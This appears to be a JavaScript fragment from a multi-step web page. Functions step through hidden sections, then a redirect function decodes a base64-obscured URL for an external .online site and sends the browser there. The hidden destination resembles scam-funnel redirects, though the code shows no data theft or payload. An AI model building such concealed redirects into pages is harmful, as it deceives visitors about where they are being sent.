function step2() {
    document.getElementById("step1").classList.add("hide")
    document.getElementById("step2").classList.remove("hide")
  }
  function step3() {
    document.getElementById("step2").classList.add("hide")
    document.getElementById("step3").classList.remove("hide")
  }
  function step4() {
    document.getElementById("step3").classList.add("hide")
    document.getElementById("step4").classList.remove("hide")
  }

  function redirect() {
      site = "aHR0cHM6Ly9wcm9wYWdhbmRvZmVsaWNpZGFkZS5vbmxpbmUv"
      location.href = atob(site);
  }